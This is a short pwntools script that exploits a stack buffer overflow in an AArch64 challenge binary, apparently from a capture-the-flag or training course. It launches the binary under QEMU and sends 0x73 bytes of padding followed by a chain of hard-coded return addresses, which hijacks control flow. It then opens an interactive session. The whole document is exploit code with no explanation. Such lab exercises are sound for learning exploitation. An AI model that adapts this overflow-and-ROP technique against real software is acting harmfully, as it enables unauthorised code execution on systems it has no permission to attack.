from pwn import *
context.arch="aarch64"
exe_name = "/usr/bin/qemu-aarch64-static"
eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-3-0-a"]
p = process(executable= exe_name, argv=eargv)
# exe_name = "/challenge/run"
# p = process(exe_name)
exp= b"A"*(0x73) \
+ 0x41FDDC.to_bytes(8, "little") + 0x401A28.to_bytes(8, "little") + b"A"*0x120 \
+ 0x41FECC.to_bytes(8, "little") + 0x40192C.to_bytes(8, "little") + b"A"*0x130 \
+ 0x41FEBC.to_bytes(8, "little") + 0x401B24.to_bytes(8, "little") + b"A"*0x130 \
+ 0x4024A4.to_bytes(8, "little") + 0x40182C.to_bytes(8, "little") + b"A"*0x130 \
+ 0x41FE6C.to_bytes(8, "little") + 0x401C20.to_bytes(8, "little") + b"A"*0x138

p.send(exp)

p.interactive()

